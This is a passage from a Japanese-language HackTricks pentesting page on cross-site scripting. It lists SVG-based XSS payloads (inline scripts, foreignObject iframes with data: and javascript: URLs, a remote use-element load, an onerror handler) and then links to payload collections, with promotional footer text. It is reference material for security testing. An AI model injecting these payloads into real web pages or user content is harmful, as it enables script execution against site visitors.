<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
**[https://github.com/allanlw/svg-cheatsheet](https://github.com/allanlw/svg-cheatsheet)**で**さらに多くのSVGペイロード**を見つけることができます。

## その他のJSトリックと関連情報

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## XSSリソース

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)

### XSSツール

[**ここでXSSのツールを見つける**](xss-tools.md)**ことができます。**

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**バグバウンティのヒント**: **ハッカーによって作成されたプレミアムなバグバウンティプラットフォーム**である**Intigritiに登録**しましょう！今すぐ[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)に参加して、最大**$100,000**のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したり、HackTricksを**PDFでダウンロード**したりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出**してください。

</details>
